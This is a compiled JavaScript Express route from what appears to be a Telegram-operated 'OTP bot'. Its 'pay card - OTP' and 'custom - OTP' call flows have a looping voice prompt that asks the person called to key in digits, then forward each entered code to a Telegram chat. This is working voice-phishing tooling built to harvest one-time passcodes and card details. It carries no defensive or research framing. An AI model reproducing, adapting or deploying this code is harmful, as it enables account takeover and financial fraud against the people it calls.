"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", { value: true });
const __1 = require("../..");
const __2 = require("../");
const uuid_1 = require("uuid");
const languages_1 = require("../../languages");
__2.app.all('/custom/:step/:chatId/:language', (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    const { actions, action } = req.query;
    const { variables } = req.query;
    const { dtmf } = JSON.parse(variables);
    const { language, chatId, step } = req.params;
    const ac = JSON.parse(String(actions));
    if (!dtmf) {
        return res.json({
            id: (0, uuid_1.v4)(),
            title: `pay card - ${chatId} OTP`,
            record: false,
            steps: [
                {
                    id: (0, uuid_1.v4)(),
                    action: 'say',
                    options: {
                        payload: (0, languages_1.getLangCustom)({
                            action: ac[0][1],
                            step: `1`,
                            language: language,
                        }),
                        language,
                        voice: 'female',
                        loop: true,
                    },
                    onKeypressGoto: 'customStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: 20,
                },
                {
                    id: (0, uuid_1.v4)(),
                    action: 'pause',
                    options: {
                        length: 5,
                    },
                    onKeypressGoto: 'customStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: 20,
                },
                {
                    id: 'customStepGoto',
                    action: 'fetchCallFlow',
                    options: {
                        url: `${process.env.ENDPOINT_URL}/custom/${step}/${chatId}/${language}?actions=${JSON.stringify(ac.splice(1, 2))}&action=${ac[0][0]}`,
                    },
                },
            ],
        });
    }
    if (dtmf) {
        yield __1.bot.telegram.sendMessage(chatId, `${action} <b>${dtmf}</b> 👻`, {
            parse_mode: 'HTML',
        });
    }
    if (ac.length) {
        return res.json({
            id: (0, uuid_1.v4)(),
            title: `custom - ${chatId} OTP`,
            record: false,
            steps: [
                {
                    id: (0, uuid_1.v4)(),
                    action: 'say',
                    options: {
                        payload: (0, languages_1.getLangCustom)({
                            action: ac[0][1],
                            dtmf: dtmf.split('').join(', '),
                            step: `2`,
                            language: language,
                        }),
                        language,
                        voice: 'female',
                        loop: true,
                    },
                    onKeypressGoto: 'customStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: 20,
                },
                {
                    id: (0, uuid_1.v4)(),
                    action: 'pause',
                    options: {
                        length: 5,
                    },
                    onKeypressGoto: 'customStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: 20,
                },
                {
                    id: 'customStepGoto',
                    action: 'fetchCallFlow',
                    options: {
                        url: `${process.env.ENDPOINT_URL}/custom/${step}/${chatId}/${language}?actions=${JSON.stringify(ac.splice(1, 2))}&action=${ac[0][0]}`,
                    },
                },
            ],
        });
    }
    return res.json({
        id: (0, uuid_1.v4)(),
        title: `call custom - ${chatId}`,
        record: false,
        steps: [
            {
                id: (0, uuid_1.v4)(),
                action: 'say',
                options: {
                    payload: (0, languages_1.getLangCustom)({
                        dtmf: dtmf.split('').join(', '),
                        step: `3`,
                        language: language,
                    }),
                    language,
                    voice: 'female',
                },
            },
        ],
    });
}));
